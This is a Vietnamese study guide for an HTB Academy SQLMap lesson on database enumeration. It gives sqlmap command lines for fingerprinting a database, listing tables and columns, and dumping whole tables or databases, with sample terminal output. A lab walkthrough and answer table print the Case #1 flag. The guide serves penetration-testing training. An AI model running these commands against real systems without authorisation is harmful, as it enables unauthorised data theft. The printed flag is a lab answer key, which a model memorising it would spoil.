# Thu Thập & Trích Xuất Dữ Liệu CSDL (Database Enumeration)

> **HTB Academy Module 58: SQLMap Essentials - Section 7 / 11**  
> *Đường dẫn bài học: `03-database-enumeration/01-database-enumeration.md`*

---

## 1. Bản Chất Của Quá Trình Thu Thập Dữ Liệu (Data Enumeration)

Sau khi SQLMap phát hiện và xác nhận thành công lỗ hổng SQL Injection (Detection Phase), bước trọng tâm tiếp theo của cuộc tấn công là **Enumeration** (Thu thập & Trích xuất dữ liệu - Data Exfiltration). Mục tiêu là rút trích toàn bộ thông tin nhạy cảm từ cơ sở dữ liệu mục tiêu ra máy của Pentester.

### Cơ Chế Hoạt Động Của SQLMap Qua File `queries.xml`:
SQLMap không gửi các câu truy vấn ngẫu nhiên mà được nạp sẵn một từ điển truy vấn chuẩn cho từng loại DBMS trong tệp [`queries.xml`](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <dbms value="MySQL">
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES"/>
        </users>
...SNIP...
```

* **Truy vấn Inband (`<inband>`)**: Được áp dụng khi mục tiêu dính **UNION query** hoặc **Error-based SQLi**. Kết quả câu truy vấn sẽ được trả về trực tiếp và trọn vẹn ngay trong HTTP response.
* **Truy vấn Blind (`<blind>`)**: Được áp dụng khi mục tiêu chỉ dính **Boolean-based blind** hoặc **Time-based blind**. Dữ liệu bắt buộc phải được bóc tách từng hàng (row-by-row), từng cột (column-by-column), và đoán từng ký tự/bit.

---

## 2. Thu Thập Thông Tin Cấu Hình Cơ Bản (Basic DB Enumeration)

Quy trình chuẩn mực luôn bắt đầu bằng việc thu thập thông tin nhận diện hệ thống:
* **`--banner`**: Lấy phiên bản chính xác của hệ quản trị CSDL (ví dụ chạy hàm `VERSION()`).
* **`--current-user`**: Lấy tên tài khoản database mà ứng dụng web đang dùng để kết nối (hàm `CURRENT_USER()`).
* **`--current-db`**: Lấy tên cơ sở dữ liệu hiện tại ứng dụng đang làm việc (hàm `DATABASE()`).
* **`--is-dba`**: Kiểm tra xem tài khoản DB hiện tại có đặc quyền Quản trị tối cao (Database Administrator - DBA) hay không (`True` hoặc `False`).

### Lệnh Thu Thập Tổng Hợp:
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba --batch
```

### Kết Quả Mẫu (Terminal Output):
```console
[13:30:57] [INFO] fetching banner
back-end DBMS: MySQL >= 5.0
banner: '5.1.41-3~bpo50+1'
[13:30:58] [INFO] fetching current user
current user: 'root@%'
[13:30:58] [INFO] fetching current database
current database: 'testdb'
[13:30:58] [INFO] testing if current user is DBA
[13:30:58] [INFO] fetching current user
current user is DBA: True
```

> [!NOTE]
> **Lưu ý về tài khoản `root` và quyền `DBA` trong Database**:  
> Tài khoản `root` hay vai trò `DBA` trong ngữ cảnh CSDL **không đồng nghĩa với tài khoản `root` của hệ điều hành Linux/Windows**. Nó chỉ đại diện cho việc tài khoản này có toàn quyền đọc/ghi/sửa/xóa mọi bảng trong phạm vi database. Tuy nhiên, nếu có quyền DBA, Pentester có cơ hội rất lớn để leo thang đọc/ghi file hệ thống hoặc thực thi lệnh OS.

---

## 3. Thu Thập Cấu Trúc Bảng & Cột (Schema Enumeration)

Sau khi biết được tên CSDL hiện tại (ví dụ: `testdb`), ta tiến hành trích xuất danh sách các bảng:

### 3.1. Liệt Kê Các Bảng (`--tables`)
```bash
sqlmap -u "http://www.example.com/?id=1" -D testdb --tables --batch
```
```text
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

### 3.2. Liệt Kê Các Cột Trong Bảng (`--columns`)
```bash
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --columns --batch
```

---

## 4. Trích Xuất Dữ Liệu Bảng (Dumping Data)

### 4.1. Trích Xuất Toàn Bộ Bảng (`--dump`)
```bash
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --dump --batch
```
```text
Database: testdb
Table: users
[4 entries]
+----+--------+------------+
| id | name   | surname    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+
[INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'
```

* Dữ liệu trích xuất sẽ được tự động lưu ra file `.csv` tại thư mục output của SQLMap. Bạn có thể đổi định dạng xuất ra bằng cờ `--dump-format=HTML` hoặc `--dump-format=SQLITE`.

### 4.2. Tinh Chỉnh Dữ Liệu Dump (Chống Nghẽn Mạng / Bảng Quá Lớn)
Trong thực tế doanh nghiệp, bảng dữ liệu có thể chứa hàng triệu dòng. Việc dump toàn bộ sẽ làm sập mạng hoặc tốn hàng giờ đồng hồ. SQLMap hỗ trợ các bộ lọc mạnh mẽ:
* **Chỉ lấy cột quan tâm (`-C`)**:
  ```bash
  sqlmap -u "http://www.example.com/?id=1" -D testdb -T users -C name,surname --dump
  ```
* **Giới hạn số dòng cần lấy (`--start` & `--stop`)**:
  ```bash
  # Chỉ lấy từ bản ghi thứ 2 đến bản ghi thứ 3
  sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --start=2 --stop=3 --dump
  ```
* **Lọc theo điều kiện truy vấn (`--where`)**:
  ```bash
  sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --where="name LIKE 'f%'" --dump
  ```

### 4.3. Dump Toàn Bộ Cơ Sở Dữ Liệu (`--dump-all`)
* Dump toàn bộ mọi database có trên máy chủ:
  ```bash
  sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs --batch
  ```
  *(Cờ **`--exclude-sysdbs`** cực kỳ quan trọng: ra lệnh cho SQLMap tự động bỏ qua các database hệ thống mặc định như `information_schema`, `performance_schema`, `mysql`, `sys` để tiết kiệm hàng chục nghìn request không cần thiết)*.

---

## 5. Hướng Dẫn Giải Bài Lab Thực Hành (HTB Case #1)

Sau khi nhấn **Spawn the target system**, bạn sẽ nhận được địa chỉ IP và Port của máy lab: `http://<TARGET_IP>:<PORT>/`.

---

### 🎯 Case #1 (Question 1): Trích Xuất Bảng `flag1` Trong CSDL `testdb`
* **Đề bài**: *What's the contents of table flag1 in the testdb database? (Case #1)*
* **Phân tích mục tiêu**: Trang `case1.php` nhận tham số `id` qua GET: `http://<TARGET_IP>:<PORT>/case1.php?id=1`.
* **Lệnh khai thác với SQLMap**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case1.php?id=1" -D testdb -T flag1 --dump --batch
  ```
* **Đầu ra trích xuất**:
  ```text
  Database: testdb
  Table: flag1
  [1 entry]
  +----+-----------------------------------------------------+
  | id | flag                                                |
  +----+-----------------------------------------------------+
  | 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
  +----+-----------------------------------------------------+
  ```
* 👉 **Flag 1**: `HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}`

---

## 6. Bảng Tổng Hợp Đáp Án Checkpoint (Official Solutions Matrix)

| STT | Câu Hỏi (HTB Academy) | Kỹ Thuật Khai Thác | Đáp Án Điền Hệ Thống |
| :---: | :--- | :--- | :---: |
| **Q1** | *What's the contents of table flag1 in the testdb database? (Case #1)* | Chỉ định Database và Bảng cần trích xuất (`-D testdb -T flag1 --dump`) | **`HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}`** |

---
*Edit by me and AI.*
